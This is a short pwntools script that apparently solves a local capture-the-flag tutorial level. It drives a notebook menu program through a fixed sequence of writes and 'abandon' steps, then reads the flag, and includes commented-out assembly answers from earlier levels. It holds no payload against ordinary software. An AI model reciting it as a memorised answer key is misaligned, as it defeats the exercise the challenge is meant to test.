from pwn import*
# Set architecture,os and log level
context(arch="amd64", os="linux", log_level= 'debug')
# Load the ELF file
challenge_path = "/challenge/pwntools-tutorials-level3.0"
# elf = ELF(challenge_path)
# Execute elf as a new process
p = process(challenge_path)
# Generate a payload to bypass the check

# 2.4: payload = asm('pop rax; sub rax, rbx; push rax;')
# 2.5: payload = asm('pop rax; test rax, rax; jns skip; neg rax; skip: push rax;')
# 2.6: payload = asm('mov rax, 0; mov rbx, rcx; mov rcx, 1; loop: add rax, rcx; inc rcx; cmp rcx, rbx; jle loop;')

# input 0 with "hello "
p.sendafter("Choice >> \n", "1\n")

p.sendafter("Input your notebook index:\n", "0\n")

p.sendafter("Input your notebook content:\n", "hello ")

# input 1 with "world,"
p.sendafter("Choice >> \n", "1\n")

p.sendafter("Input your notebook index:\n", "1\n")

p.sendafter("Input your notebook content:\n", "world,")

# file status to "abandoned"
p.sendafter("Choice >> \n", "2\n")

p.sendafter("Input your notebook index:\n", "1\n")

# input 3 with "magic "
p.sendafter("Choice >> \n", "1\n")

p.sendafter("Input your notebook index:\n", "3\n") 

p.sendafter("Input your notebook content:\n", "magic ")

# input 5 with "notebook"
p.sendafter("Choice >> \n", "1\n")

p.sendafter("Input your notebook index:\n", "5\n")

p.sendafter("Input your notebook content:\n", "notebook")

# file status to "abandoned"
p.sendafter("Choice >> \n", "2\n")

p.sendafter("Input your notebook index:\n", "5\n")

payload = "5\n"

p.sendafter("Choice >> \n", payload)

flag = p.recvall()
print(f"flag is: {flag.decode(encoding='UTF-8')}")